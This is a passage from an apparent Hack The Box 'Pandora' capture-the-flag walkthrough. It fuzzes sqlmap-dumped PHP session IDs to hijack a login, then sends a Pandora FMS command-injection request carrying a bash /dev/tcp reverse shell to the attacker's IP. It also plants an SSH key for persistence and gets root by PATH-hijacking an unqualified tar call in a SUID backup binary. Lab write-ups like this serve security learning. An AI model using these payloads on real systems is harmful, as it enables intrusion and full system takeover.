| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";                            | 1638168416  |
| qf9chmddo4gu2v1rbtqgdjmb3h | NULL                                                | 1675858893  |
| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                | 1638787723  |
| r097jr6k9s7k166vkvaj17na1u | NULL                                                | 1638787677  |
| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";                            | 1638889082  |
| sq2lbdsfp1jf650l0imt66pmmi | NULL                                                | 1675859272  |
| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";                            | 1638547193  |
| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";                            | 1638793297  |
| ubj3gf8t8mnr6tn7g1d4ok7e9d | NULL                                                | 1675858665  |
+----------------------------+-----------------------------------------------------+-------------+

[13:30:18] [INFO] table 'pandora.tsessions_php' dumped to CSV file '/home/mark/.local/share/sqlmap/output/localhost/dump/pandora/tsessions_php.csv'
[13:30:18] [INFO] fetched data logged to text files under '/home/mark/.local/share/sqlmap/output/localhost'

[*] ending @ 13:30:18 /2023-02-08/
```

Ok cool maybe one of this session will be valid. I need to separate the whole session column and save in a file 

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Pandora]
└─$ cat /home/mark/.local/share/sqlmap/output/localhost/dump/pandora/tsessions_php.csv | cut -d "," -f 1 > possiblesession
                                                                                                                                                                                                                   
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Pandora]
└─$ head possiblesession                                                                                      
id_session
09vao3q1dikuoi1vhcvhcjjbc6
0ahul7feb1l9db7ffp8d25sjba
1um23if7s531kqf5da14kf5lvm
2e25c62vc3odbppmg6pjbf9bum
346uqacafar8pipuppubqet7ut
374vrl53ppsglk498thah0iqse
3aqsjo38dl7967tehfkmefeic2
3me2jjab4atfa5f8106iklh4fc
4f51mju7kcuonuqor3876n8o02
```

Now i can attempt to fuzz valid session

```
┌──(venv)─(mark__haxor)-[~/Desktop/B2B/HTB/Pandora]
└─$ ffuf -c -u http://localhost/pandora_console/ -H "Cookie: PHPSESSID=FUZZ" -w possiblesession -fl 248

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost/pandora_console/
 :: Wordlist         : FUZZ: possiblesession
 :: Header           : Cookie: PHPSESSID=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response lines: 248
________________________________________________

g4e01qdgk36mfdh90hvcc54umq [Status: 200, Size: 75293, Words: 15288, Lines: 1387, Duration: 879ms]
:: Progress: [51/51] :: Job [1/1] :: 13 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```

Now i'll add the update my cookie to that 
![image](https://user-images.githubusercontent.com/113513376/217531604-c065897e-d4b6-4f64-9811-1c6540fdcbb4.png)

When i refresh the page i get logged in
![image](https://user-images.githubusercontent.com/113513376/217531801-3e8b4967-de78-448f-8fc4-cb0ca0ef53ee.png)

Now i'll use the exploit [Exploit](https://www.coresecurity.com/core-labs/advisories/pandora-fms-community-multiple-vulnerabilities)

Here's my request

```
POST /pandora_console/ajax.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 124
Origin: http://localhost
Connection: close
Referer: http://127.0.0.1/pandora_console/index.php?sec=eventos&sec2=operation/events/events
Cookie: PHPSESSID=g4e01qdgk36mfdh90hvcc54umq

page=include/ajax/events&perform_event_response=10000000&target=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.16.7/1337+0>%261"&response_id=1
```

Back on the listener i get a callback connection

```
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.136] 43904
bash: cannot set terminal process group (4433): Inappropriate ioctl for device
bash: no job control in this shell
matt@pandora:/var/www/pandora/pandora_console$ 
```

Now i'll stabilize the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL +Z 
stty raw -echo;fg
reset
```

So lets get root

```
matt@pandora:/var/www/pandora/pandora_console$ cd 
bash: cd: HOME not set
matt@pandora:/var/www/pandora/pandora_console$ cd /home/matt/
matt@pandora:/home/matt$ ls -al
total 24
drwxr-xr-x 2 matt matt 4096 Dec  7  2021 .
drwxr-xr-x 4 root root 4096 Dec  7  2021 ..
lrwxrwxrwx 1 matt matt    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r-- 1 matt matt  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 matt matt 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 matt matt  807 Feb 25  2020 .profile
-rw-r----- 1 root matt   33 Feb  8 11:17 user.txt
matt@pandora:/home/matt$ 
```

Searching for suid binary shows this

```
matt@pandora:/home/matt$ find / -type f -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
```

The connection of the shell closes. So what i did was to put my public ssh key in the user's .ssh/ dir then ssh as matt without password

```
┌──(mark__haxor)-[~/_/B2B/THM/VulnetSeries/Dotpy]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.11.136] 44164
bash: cannot set terminal process group (4643): Inappropriate ioctl for device
bash: no job control in this shell
matt@pandora:/var/www/pandora/pandora_console$ cd /home/mat
cd /home/mat
bash: cd: /home/mat: No such file or directory
matt@pandora:/var/www/pandora/pandora_console$ cd /home/matt
cd /home/matt
matt@pandora:/home/matt$ cd .ssh
cd .ssh
matt@pandora:/home/matt/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+v9KjdAD6ipWpFUKPh2t7yEE/pm/2sJJMXRPLwPelFOEyhxeaslj2FF322hsWme0kBbWnyU6NeM3TV4sxKIPITFni2HJLMcamaSdvH4N5HCfxBHlkEGBvWzzQz/SYbrv4BwuuyTPTwMA6hwQ32L+XtBDZwxEfowwr2weI8RgIWXFvwngrUOej9pYUO6ZIWxp3xJZ9TIChwtBxClodcla4eiMLCbXzzSuS1Bt2Q/79CHT0p97ydsuy+IiFN7nvJLP90yYzMIuVK1FB/x4nXpHPiVnTDX87agGif70OOOru+2sp3F/R2slpSeM+vlJidHrV2yHi3RAdZlE4od/dvHGJM6qJJleRfR6p6m7I67UHax4z0m8aQOJ8GGHXJm7+HGuThi+2tLVy5RauiSe1s94TmqrZLT9S9NO+3sJYEclBGP0dR22XUYyURXkKNVefr01Ia3qR2ptMwJkf4ijolWuLvkeU2WaPT6wxCpNjHEXsZqmvS7IiIiLsNKrDXtf/cn0= mark@haxor" >> authorized_keys
<S7IiIiLsNKrDXtf/cn0= mark@haxor" >> authorized_keys
matt@pandora:/home/matt/.ssh$ 
```

Now i can ssh as matt

```
┌──(mark__haxor)-[~/.ssh]
└─$ ssh matt@10.10.11.136          
The authenticity of host '10.10.11.136 (10.10.11.136)' can't be established.
ED25519 key fingerprint is SHA256:yDtxiXxKzUipXy+nLREcsfpv/fRomqveZjm6PXq9+BY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:56: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.136' (ED25519) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed  8 Feb 13:08:06 UTC 2023

  System load:           0.0
  Usage of /:            63.2% of 4.87GB
  Memory usage:          16%
  Swap usage:            0%
  Processes:             244
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.136
  IPv6 address for eth0: dead:beef::250:56ff:feb9:7d86

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

matt@pandora:~$ 
```

So lets check out the suid binary

```
matt@pandora:~$ file /usr/bin/pandora_backup 
/usr/bin/pandora_backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7174c3b04737ad11254839c20c8dab66fce55af8, for GNU/Linux 3.2.0, not stripped
matt@pandora:~$
```

I'll download it on my machine and decompile it using ghidra

```
### Target

matt@pandora:~$ cd /usr/bin
matt@pandora:/usr/bin$ python3 -m http.server 8081 
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.10.16.7 - - [08/Feb/2023 13:11:14] "GET /pandora_backup HTTP/1.1" 200 -

### Attacker

──(mark__haxor)-[~/Desktop/B2B/HTB/Pandora]
└─$ wget panda.htb:8081/pandora_backup                              
--2023-02-08 14:11:14--  http://panda.htb:8081/pandora_backup
Resolving panda.htb (panda.htb)... 10.10.11.136
Connecting to panda.htb (panda.htb)|10.10.11.136|:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16816 (16K) [application/octet-stream]
Saving to: _pandora_backup_

pandora_backup                                       100%[=====================================================================================================================>]  16.42K  64.3KB/s    in 0.3s    

2023-02-08 14:11:15 (64.3 KB/s) - _pandora_backup_ saved [16816/16816]

┌──(mark__haxor)-[~/Desktop/B2B/HTB/Pandora]
└─$ file pandora_backup                                                                                                                
pandora_backup: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7174c3b04737ad11254839c20c8dab66fce55af8, for GNU/Linux 3.2.0, not stripped
```

Now i'll analyze the binary using ghidra

Here's the decompiled main function

```
bool main(void)

{
  __uid_t __euid;
  __uid_t __ruid;
  int iVar1;
  
  __euid = getuid();
  __ruid = geteuid();
  setreuid(__ruid,__euid);
  puts("PandoraFMS Backup Utility");
  puts("Now attempting to backup PandoraFMS client");
  iVar1 = system("tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*");
  if (iVar1 == 0) {
    puts("Backup successful!");
    puts("Terminating program!");
  }
  else {
    puts("Backup failed!\nCheck your permissions!");
  }
  return iVar1 != 0;
}

```

Cool so here's whats happening

```
1. It prints out "PandoraFMS Backup Utility"
2. Then it runs system command on tar
3. So the tar command compresses the pandora_console and saves it in the /root dir
4. It then does an if check to know if the userid is 0 it prints "Backup successful"
5. If the condition isn't meet it prints "Check your permission
```

So we don't need to worry about the userid thingy cause its an suid binary so it will run as root

But the problem in the code is that it runs system on tar but doesn't specify the full path of tar

```
Right = /usr/bin/tar
Wrong = tar
```

So we can basically leverage this by performing a path hijack 

Here's the way to do it

```
matt@pandora:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
matt@pandora:~$ nano tar
matt@pandora:~$ chmod +x tar
matt@pandora:~$ cat tar
#!/usr/bin/bash

/usr/bin/bash
matt@pandora:~$ export PATH=/home/matt:$PATH
matt@pandora:~$ echo $PATH
/home/matt:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
matt@pandora:~$ 
```

So now if we run the suid binary, when tar is called it will look it up from the path variable and since /home/matt has a tar file it will use that instead of the original tar binary

```
matt@pandora:~$ pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:~# cd /root                                                                                                                                               
root@pandora:/root# ls -al
total 36
drwx------  5 root root 4096 Jan  3  2022 .
drwxr-xr-x 18 root root 4096 Dec  7  2021 ..
drwxr-xr-x  2 root root 4096 Feb  8 13:09 .backup
lrwxrwxrwx  1 root root    9 Jun 11  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Jan  3  2022 .cache
-rw-r--r--  1 root root  250 Feb  8 11:17 .host_check
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-r--------  1 root root   33 Feb  8 11:17 root.txt
drwx------  2 root root 4096 Dec  7  2021 .ssh 
```

And we're done

<br> <br>
[Back To Home](../../index.md)
